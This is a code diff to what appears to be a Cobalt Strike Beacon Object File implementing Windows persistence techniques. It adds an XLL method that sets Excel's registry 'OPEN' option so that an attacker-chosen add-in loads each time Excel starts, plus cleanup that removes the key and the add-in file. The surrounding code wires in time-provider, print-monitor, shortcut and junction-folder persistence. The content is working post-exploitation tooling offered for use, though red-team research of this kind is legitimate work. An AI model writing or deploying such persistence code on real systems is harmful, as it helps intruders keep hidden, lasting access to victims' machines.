@@ -5,10 +5,25 @@
 //#define PRINTMONITOR
 //#define ShortCutStartup
 //#define JUNCTION
+//#define XLL
 
 
 WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
 WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);
+
+#ifdef XLL
+WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExW(HKEY hKey, LPCWSTR  lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD   lpdwDisposition);
+WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetKeyValueW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData);
+WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyW(HKEY hKey, LPCWSTR lpSubKey);
+WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteValueW(HKEY hKey, LPCWSTR lpValueName);
+WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
+
+WINBASEAPI HRESULT WINAPI SHELL32$SHGetKnownFolderPath(GUID* rfid, DWORD dwFlags, HANDLE hToken, PWSTR* ppszPath);
+
+WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* dest, const wchar_t* src);
+WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* str);
+WINBASEAPI wchar_t* __cdecl MSVCRT$wcscpy(wchar_t* dest, const wchar_t* src);
+#endif
 
 //Junction Folder
 #ifdef JUNCTION
@@ -444,6 +459,8 @@ BOOL PrintMonitorPersistence(int cmd, wchar_t* monName, wchar_t* dllname)
 	return success;
 }
 #endif
+
+
 #ifdef JUNCTION
 
 BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* CLSID)
@@ -669,6 +686,88 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* C
 }
 #endif
 
+#ifdef XLL
+BOOL XllSetup(int clean, wchar_t* xllName, wchar_t* excelVersion)
+{
+	LSTATUS status = -1;
+	HKEY phkResult = 0;
+	size_t len = 0;
+	BOOL success = TRUE;
+	wchar_t xllPath[MAX_PATH] = {0};
+	wchar_t pFullKeyPath[512] = L"Software\\Microsoft\\Office\\";
+	MSVCRT$wcscat(pFullKeyPath, excelVersion);
+	wchar_t* pKeyRemainder = L".0\\Excel\\Options\0";
+	MSVCRT$wcscat(pFullKeyPath, pKeyRemainder);
+	wchar_t* openKey = L"OPEN";
+
+			//Open HKEY_CURRENT_USER\Software\Microsoft\Office\{VERSION}\Excel\Options
+		status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, NULL, &phkResult, NULL);
+		if (0 != status)
+		{
+			BeaconPrintf(CALLBACK_ERROR, "Could not create %ls, Error: %d\n", pFullKeyPath, KERNEL32$GetLastError());
+			return FALSE;
+		}
+
+	if (clean == 0)
+	{
+			MSVCRT$wcscat(xllPath, L"/R ");
+			MSVCRT$wcscat(xllPath, xllName);
+			MSVCRT$wcscat(xllPath, L"\0");
+			len = MSVCRT$wcslen(xllPath) * 2 + 1;
+			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, openKey, REG_SZ, xllPath, (DWORD)len);
+			if (0 != status)
+			{
+				success = FALSE;
+			}
+		
+	}
+	else
+	{
+		status = ADVAPI32$RegDeleteValueW(phkResult, openKey);
+		if (0 != status)
+		{
+			BeaconPrintf(CALLBACK_ERROR, "Could not delete registry key, Error: %d\n", KERNEL32$GetLastError());
+			success = FALSE;
+		}
+		else
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully cleaned registry key\n");
+		//%APPDATA%
+		const GUID xFOLDERID_AppData = { 0x3EB685DB, 0x65F9, 0x4CF6, { 0xA0, 0x3A, 0xE3, 0xEF, 0x65, 0x72, 0x9F, 0x3D } };
+		WCHAR* pAppDataPath = NULL;
+		HRESULT hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_AppData, 0, NULL, &pAppDataPath);
+		if (hRes != 0)
+		{
+			BeaconPrintf(CALLBACK_ERROR, "Could not find known folder ID\n");
+			success = FALSE;
+		}
+		else
+		{
+			MSVCRT$wcscat(xllPath, pAppDataPath);
+			MSVCRT$wcscat(xllPath, L"\\Microsoft\\AddIns\\");
+			MSVCRT$wcscat(xllPath, xllName);
+			MSVCRT$wcscat(xllPath, L"\0");
+			if (!KERNEL32$DeleteFileW((LPCWSTR)xllPath))
+			{
+				success = FALSE;
+				BeaconPrintf(CALLBACK_ERROR, "Could not delete %ls, Error: %d\n", xllPath, KERNEL32$GetLastError());
+			}
+			else
+			{
+				BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", xllPath);
+			}
+		}
+
+
+	}
+
+	if (phkResult)
+		ADVAPI32$RegCloseKey(phkResult);
+
+	
+	return success;
+}
+#endif
+
 #ifdef TIME
 // Based on https://pentestlab.blog/2019/10/22/persistence-time-providers/
 BOOL RegisterTimeProvider(int cmd, wchar_t* pFullKeyPath, wchar_t* dllName)
@@ -756,21 +855,21 @@ BOOL RegisterTimeProvider(int cmd, wchar_t* pFullKeyPath, wchar_t* dllName)
 
 void go(char* args, int length) {
 
-	wchar_t* regName = NULL;
-	wchar_t* dllName = NULL;
+	wchar_t* arg1 = NULL;
+	wchar_t* arg2 = NULL;
 	wchar_t* clsid = NULL;
-	int szDllName = 0;
-	int szRegName = 0;
-	int szClsid = 0;
+	int sizeArg1 = 0;
+	int sizeArg2 = 0;
+	int sizeClsid = 0;
 	DWORD arg = 0;
 	datap  parser;
 
 	BeaconDataParse(&parser, args, length);
 	arg = BeaconDataInt(&parser);
-	regName = (wchar_t*)BeaconDataExtract(&parser, &szRegName);
-	dllName = (wchar_t*)BeaconDataExtract(&parser, &szDllName);
+	arg1 = (wchar_t*)BeaconDataExtract(&parser, &sizeArg1);
+	arg2 = (wchar_t*)BeaconDataExtract(&parser, &sizeArg2);
 
-	if (regName == NULL || dllName == NULL)
+	if (arg1 == NULL || arg2 == NULL)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Arg parsing failed\n");
 		return;
@@ -780,9 +879,9 @@ void go(char* args, int length) {
 #ifdef TIME
 
 	wchar_t pFullKeyPath[512] = L"SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\";
-	MSVCRT$wcscat(pFullKeyPath, regName);
+	MSVCRT$wcscat(pFullKeyPath, arg1);
 
-	if (!RegisterTimeProvider(arg, pFullKeyPath, dllName))
+	if (!RegisterTimeProvider(arg, pFullKeyPath, arg2))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
 		return;
@@ -791,23 +890,32 @@ void go(char* args, int length) {
 #endif
 #ifdef PRINTMONITOR
 
-	if (!PrintMonitorPersistence(arg, regName, dllName))
+	if (!PrintMonitorPersistence(arg, arg1, arg2))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
 		return;
 	}
 #endif
 #ifdef ShortCutStartup
-	BuildShortCut(arg, regName, dllName);
+	BuildShortCut(arg, arg1, arg2);
 
 #endif
+
+#ifdef XLL
+	if(!XllSetup(arg, arg1, arg2))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
+		return;
+	}
+#endif
 #ifdef JUNCTION
+
 	if(arg == 1)
 	{
-		clsid = (wchar_t*)BeaconDataExtract(&parser, &szClsid);
+		clsid = (wchar_t*)BeaconDataExtract(&parser, &sizeClsid);
 	}
 
-	if (!JunctionFolder(arg, regName, dllName, clsid))
+	if (!JunctionFolder(arg, arg1, arg2, clsid))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
 		return;
